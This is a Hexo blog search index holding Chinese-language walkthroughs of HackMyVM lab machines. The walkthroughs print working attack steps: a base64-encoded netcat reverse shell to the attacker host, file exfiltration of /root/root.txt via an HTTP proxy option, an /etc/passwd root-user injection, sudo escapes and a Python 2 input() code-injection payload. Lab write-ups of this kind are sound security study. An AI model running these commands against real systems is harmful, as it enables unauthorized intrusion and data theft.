<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/15/hello-world/</url>
    <content><![CDATA[<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm first 复盘</title>
    <url>/2024/03/15/new/index/</url>
    <content><![CDATA[<h4 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机ip 192.168.64.75</span><br><span class="line">攻击机ip 192.168.64.3</span><br></pre></td></tr></table></figure>

<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫描到3个端口，21端口，22端口和80端口</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2020.08.29.png"   alt="d" style="zoom:40%;" >

<p>80端口看不到什么内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.09.52.png" ></p>
<p>nmap扫出来ftp端口有几个文件夹，登陆看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.64.75</span><br></pre></td></tr></table></figure>

<p>登陆账号密码都是ftp就行，看来看去只有first文件夹下面有个图片。下载出来</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.15.00.png" ></p>
<p>接着就使用<strong>stegseek</strong>工具分析一下，自动分析出一个secret.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ stegseek first.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: &quot;firstgurl1&quot;</span><br><span class="line">[i] Original filename: &quot;secret.txt&quot;.</span><br><span class="line">[i] Extracting to &quot;first.jpg.out&quot;.</span><br><span class="line">the file &quot;first.jpg.out&quot; does already exist. overwrite ? (y/n)</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt</span><br><span class="line">SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==</span><br></pre></td></tr></table></figure>

<p>secret.txt里面是串base64字符，解密一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt| base64 -d</span><br><span class="line">Hi I had to change the name of the todo list becouse directory busting is too easy theese days also I encoded this in besa64 becouse it is cool btw your todo list is : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74 do it quick we are vulnarable do the first first</span><br></pre></td></tr></table></figure>

<p>注意看中间有一串十六机制数字，再解密一下，得到一个目录，访问一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.23.png" ></p>
<h4 id="第一个shell"><a href="#第一个shell" class="headerlink" title="第一个shell"></a>第一个shell</h4><p>注意到第二点提到有upload.php，扫一下目录试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.57.png" ></p>
<p>扫到一个uploads目录和一个upload.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.21.33.png" ></p>
<p>可以发现文件上传没有任何过滤，那直接上传一个一句话木马</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.22.48.png" ></p>
<p>蚁剑连接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.27.44.png" ></p>
<p>接下来我在目录上传一个后门php，kali开启监听，在蚁剑虚拟终端中用php，即可拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.31.02.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l查到有neofetch可以利用，<a class="link"   href="https://gtfobins.github.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F" >https://gtfobins.github.io/在这个网站查询到提权方式<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.39.02.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.38.30.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@first:/tmp$ echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">www-data@first:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">a.sh</span><br><span class="line">www-data@first:/tmp$ sudo -u first neofetch --config a.sh</span><br><span class="line">sudo -u first neofetch --config a.sh</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure>

<p>成功拿到first到shell</p>
<p>再次sudo -l，发现有个secret，file查看发现是个二进制文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.43.22.png" ></p>
<p>下载到本地用ida分析一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.45.15.png" ></p>
<p>学习别的wp指导这里有个栈溢出（这块地方有待学习），输入超过10个字符串就会执行我们的command，<strong>思路就是sudo调用，然后给一个&#x2F;bin&#x2F;bash</strong>就拿到root到权限了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.47.23.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>图片隐写分析，提权命令利用，栈溢出的利用。</p>
]]></content>
      <tags>
        <tag>blog</tag>
        <tag>hackmyvm</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm复盘</title>
    <url>/2024/03/16/hackmyvm%E5%A4%8D%E7%9B%981/</url>
    <content><![CDATA[<h3 id="translator"><a href="#translator" class="headerlink" title="translator"></a>translator</h3><p>来到80端口看到有个translator的界面，随便输了abc，返回zyx，试了几次确认加密逻辑就是一对一替换，a-z，b-y这样，但是数字和大写字母是不会变的，扫了目录也没看到有什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.15.54.png" ></p>
<p>然后看了wp才知道，<strong>这个输入框可以命令注入，要先有个分号隔断，并且要输入的命令要先transalte一下</strong>（有点解谜），比如要使用id命令，就要输入“；rw”</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.22.42.png"   alt="像这样" style="zoom:50%;" >

<p>那就先nc拿到一个shell，主要要先把命令translate一下</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316182706.png"   style="zoom:50%;" >

<p>就拿到第一个shell，我感觉有点脑洞，可能是见识的不够多吧，代码逻辑如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test = $_GET[&#x27;hmv&#x27;];</span><br><span class="line">$test = escapeshellcmd($test);// 应该是用来防止命令注入的，输入分号后前面跟了一个\，但是经过下面第一个system斜杆又没了</span><br><span class="line">echo (&quot;Translated to:&quot;);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$ultima_linea = system(&#x27;echo &#x27;.$test.&#x27;| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba&#x27;);</span><br><span class="line">$ulti = system(&#x27;echo &#x27;.$ultima_linea.&#x27;| tr &quot;php&quot; &quot;wtf&quot;&#x27;); // 用分号实现命令注入</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后在html目录下有个hvxing文件，打开查看是段字符串，第一反应是拿去网页translate一下</p>
<p>然后就拿到一个密码，到&#x2F;home目录下看到有两个用户，尝试了一下ocean登陆成功</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185134.png"   style="zoom:50%;" >

<p>然后sudo -l看到有choom可以利用，india可以不用密码，gtfobins查询到了提权命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u india /usr/bin/choom -n 0 /bin/sh</span><br></pre></td></tr></table></figure>

<h4 id="第二个flag"><a href="#第二个flag" class="headerlink" title="第二个flag"></a>第二个flag</h4><p>就切换到了india账户，再sudo -l查找，有一个trans可以利用，file看了一下是个是个shell的脚本</p>
<p>cat看了一下内容很多，切换个思路-h看看帮助文档</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185857.png"   style="zoom:50%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185917.png"   style="zoom:50%;" >

<p>注意到有input file也可以开个http代理，那就尝试结合这两个功能把&#x2F;root&#x2F;root.txt读出来</p>
<p>kali先开个nc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo trans -i /root/root.txt -x 192.168.64.3:8888</span><br><span class="line">nc -lvp 8888 &gt; trans</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316190434.png"   style="zoom:50%;" >

<p>得到一个包，尝试了一下url解码q后面的内容，就拿到flag</p>
<h4 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512</span><br></pre></td></tr></table></figure>

<p>先生成一个哈希字符串，然后拼接一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">but:$6$qzFU83LRKpBUmZCQ$qCQiwtXEjJmtTAOO2HRJsneHiliw9k2V2/3EtU64v9tP2eaud5fdtp5pQurFVtEsovQjfbo2j3KY.JmF0QqEL/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>先复制一份原来的&#x2F;etc&#x2F;passwd，在&#x2F;tmp目录下伪造一个一样的最下面在加入我们伪造的字符串，<strong>思路就给靶机多加一个用户，有root权限</strong>，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u root trans -i www -o /etc/passwd -no-auto</span><br></pre></td></tr></table></figure>

<p>写入之后登陆我们伪造的用户，成功提权到root</p>
<h5 id="小抽象"><a href="#小抽象" class="headerlink" title="小抽象"></a>小抽象</h5><p>就是利用读写功能获取我们想要的东西，也可以对关键文件进行篡改</p>
<h3 id="teacher"><a href="#teacher" class="headerlink" title="teacher"></a>teacher</h3><p>web端扫描目录扫到，access.php,log.php，clearlog.php，看一下log.php，内容说有一个rabbit.jpg，访问之后一张·图片·，最开始用stegseek出了得到一个secret.txt里面写着”rabbithole”，不明所以，尝试登陆ssh也没有用</p>
<p>去到access.jpg，源代码src后面是空的，就联想到有没有可以写入的参数，fuzz了一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200751.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -u &#x27;http://192.168.64.77/access.php?FUZZ=rabbit.jpg&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=12</span><br></pre></td></tr></table></figure>

<p>果然得到了一个参数‘id’，然后看到了图片</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200944.png" ></p>
<p>再看看这时的源码，然后就联想到命令注入，先闭合单引号，在写入命令试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201116.png" ></p>
<p>经过一番探索（结合wp），发现可以直接注入php语句，还要配合前面的log.php，因为access.php不会执行，log.php记录了这些并且会执行，例如：</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201809.png" ></p>
<p>发现了利用点，那就拿到第一个shell了，在html目录下发现有个pdf，下载查看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202025.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202055.png" ></p>
<p>虽然密码被糊住了，但是可以在前面找到自己，反向写出来就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pass = ThankYouTeachers</span><br></pre></td></tr></table></figure>

<p>然后就登陆了mrteacher账户，成功拿到userflag</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>Sudo -l 看到有gedit和xauth可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth</span><br></pre></td></tr></table></figure>

<p>查了一下，<strong>xauth命令</strong> 用于显示和编辑被用于连接X服务器的认证信息。<strong>gedit</strong>是个文本编辑器</p>
<p><strong>思路就是利用gedit查看或修改root.txt（或其他任意文件），在这之前要先利用xauth增加一个认证，并且ssh登陆账号要加-x让SSH 客户端会在连接过程中启用 X11 转发。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh -X mrteacher@192.168.64.77</span><br><span class="line">mrteacher@192.168.64.77&#x27;s password: </span><br><span class="line">Linux Teacher 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sat Mar 16 13:25:36 2024 from 192.168.64.3</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth list  列出当前用户的 X 认证信息</span><br><span class="line">Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth add Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">向授权文件中添加一个 MIT-MAGIC-COOKIE-1 权限</span><br></pre></td></tr></table></figure>

<p>增加权限后就使用gedit了，这个时候可以直接读取rootflag，也可以修改&#x2F;etc&#x2F;passwd增加一个用户提权（像上一个靶机一样），两种思路都可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /root/root</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>web端命令注入结合日志文件，提权方面两个可利用点的结合，伪造用户或读取文件。</p>
<h3 id="warrior"><a href="#warrior" class="headerlink" title="warrior"></a>warrior</h3><p>web端扫到robots.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014210.png" ></p>
<p>User.txt里面有个名字‘loco’我还想过爆破ssh，没有结果，secret.txt一个字符串看起来不是密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014232.png" ></p>
<p>internal.php说要把MAC地址改成00:00:00:00:00:a? 最后一个问号还要一个一个试，网上找教程修改kali都mac地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 down</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 hw ether 00:00:00:00:00:af //最后试出来是af</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 up                        </span><br><span class="line">                                  </span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317011739.png" ></p>
<p>然后再访问，就得到了密码，我尝试了loco作为用户名居然无效，最后看了wp才知道还有一个用户名可以是bro（扶额苦笑），然后顺利登陆，想输入sudo回显没有这个命令，路径没设置好，要调用应该在&#x2F;usr&#x2F;sbin&#x2F;sudo，查到有个task可以利用，找了提权语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/sbin/sudo /usr/bin/task execute /bin/sh</span><br></pre></td></tr></table></figure>

<p>顺利拿到root</p>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>这个靶机的点主要在切换mac地址，还要尝试出来最后一位是f，bro这个也难想，以后要多考虑可以用cewl生成字典，提权比较简单。</p>
]]></content>
      <tags>
        <tag>blog</tag>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm djinn复盘</title>
    <url>/2024/03/18/hackmyvm-djinn%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/?v=djin" >https://hackmyvm.eu/machines/?v=djin<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>端口扫描，扫到21，1337，7331开放，先用anonymous作为账号密码登陆21号端口，有三个txt文件，下载来看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105541.png" ></p>
<p>game里面说1337端口有个game，nc连接一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105737.png" ></p>
<p>是个计算游戏，需要算对一千次，这种就需要写个脚本解决了（以下脚本是参考wp的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">c = pwn.remote(<span class="string">&#x27;192.168.64.80&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>) <span class="comment"># 建立一个远程联机</span></span><br><span class="line">c.recvuntil(<span class="string">&#x27;gift.\n&#x27;</span>) <span class="comment"># 接收连接中的数据，直到遇到字符串 &#x27;gift.\n&#x27; 为止</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">1001</span>: <span class="comment"># 做1000次循环</span></span><br><span class="line">   count += <span class="number">1</span></span><br><span class="line">   data = c.recvuntil(<span class="string">b&quot;)&quot;</span>).decode()</span><br><span class="line">   c.recv() <span class="comment"># 接收连接中的数据，但不做任何处理，用于清空缓冲区</span></span><br><span class="line">   <span class="built_in">print</span>(data)</span><br><span class="line">   num1, num2, todo = <span class="built_in">int</span>(data[<span class="number">1</span>]), <span class="built_in">int</span>(data[<span class="number">9</span>]), data[<span class="number">5</span>]</span><br><span class="line">   <span class="keyword">if</span> todo == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">      answer= num1 + num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">      answer= num1 - num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">      answer= num1 * num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">      answer= num1 / num2</span><br><span class="line">   c.send((<span class="built_in">str</span>(answer) + <span class="string">&quot;\n\r&quot;</span>).encode())</span><br><span class="line">   <span class="keyword">if</span> count &gt; <span class="number">998</span>: <span class="comment"># 打印最后几次的详细信息</span></span><br><span class="line">        <span class="built_in">print</span>(answer, count)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.recv().decode())</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110431.png" ></p>
<p>跑完脚本最后给了三个数字，猜测是敲门，此时22端口是关着的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110523.png" ></p>
<p>按顺序敲门后，22号端口打开了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110607.png" ></p>
<p>接着我想用刚刚拿到的“nitu:81299””nitish81299”尝试登陆ssh，都没有用，这个时候想到之前有个7331端口还没看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.07.20.png" ></p>
<p>先扫目录，用了一个大一点的字典后扫到有&#x2F;wish &#x2F;genie</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112555.png" ></p>
<p>访问&#x2F;wish，有个可以execute的，输入id试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111003.png" ></p>
<p>跳转到了genie，注意url有出现www-data，说明是执行成功的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111039.png" ></p>
<p>接下来反弹shell，经过多次尝试，发现可以利用拿到第一个shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ` <span class="built_in">echo</span> <span class="string">&quot;cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjY0LjMgODg4OCA+L3RtcC9m&quot;</span> | <span class="built_in">base64</span> -d ` | sh -</span><br><span class="line"></span><br><span class="line"><span class="built_in">base64</span>解码的内容是：<span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.64.3 8888 &gt;/tmp/f</span><br><span class="line">管道 ｜sh - 表示讲解码后的内容交给sh当成脚本执行</span><br></pre></td></tr></table></figure>

<h4 id="提权方式1"><a href="#提权方式1" class="headerlink" title="提权方式1"></a>提权方式1</h4><p>拿到第一个shell后，使用find查看有没有什么可以用（sudo -l找不到什么可以用的）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>看到pkexec可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.18.35.png" ></p>
<p>查找到版本是0.105，上网搜索了一下有没有可以用的脚本，最后找到<a class="link"   href="https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/" >https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/<i class="fas fa-external-link-alt"></i></a> 可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.21.58.png" ></p>
<p>成功提权到root</p>
<h4 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h4><p>切换到home目录下，有nitish和sam两个用户，sam目录进不去，在nitish目录的.dev目录下有个creds.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112450.png" ></p>
<p>有一个密码，接下来用ssh登陆nitish账户</p>
<p>p4ssw0rdStr3r0n9</p>
<p>sudo -l发现有个genie可以利用，在网上找现成的提权方式失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112652.png" ></p>
<p>-h查看帮助，有一个-e执行cmd，但是还是失败了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112941.png" ></p>
<p>然后用man查看genie，发现有个cmd</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113121.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u sam /usr/bin/genie -cmd 随便写点</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113234.png" ></p>
<p>成功拿到sam的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113352.png" ></p>
<p>sudo -l看到有个lago可以利用，执行看看，测试了一下，有几个选项，其中比较有用的是有个猜数游戏</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113515.png" ></p>
<h5 id="解决思路1（暴力）"><a href="#解决思路1（暴力）" class="headerlink" title="解决思路1（暴力）"></a>解决思路1（暴力）</h5><p>用个一直循环的脚本，一直坚持猜同一个数字，看运气，总有能猜对的时候</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> sudo /root/lago; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113812.png" ></p>
<h5 id="解决思路2"><a href="#解决思路2" class="headerlink" title="解决思路2"></a>解决思路2</h5><p>在&#x2F;home&#x2F;sam的目录下有个.pyc文件，下载下来反编译一下，就能看到lago的源码，注意到</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318114957.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.08.59.png" ></p>
<p>选项2那里有个判断，要判断s是否等于num，那直接输入num，input把你传递的num当成了一个变量（注意靶机的pyhton版本是2.x，如果是3以上的版本这个思路不行），num&#x3D;num自然就可以了，神奇。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318115124.png" ></p>
<p>也可以利用input的动态载入，也能拿到root</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)</span><br></pre></td></tr></table></figure>

<p>输入这个python2的input支持动态载入，把这个语句当成表达式执行，如果是pyhton3就只会当成字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113923.png" ></p>
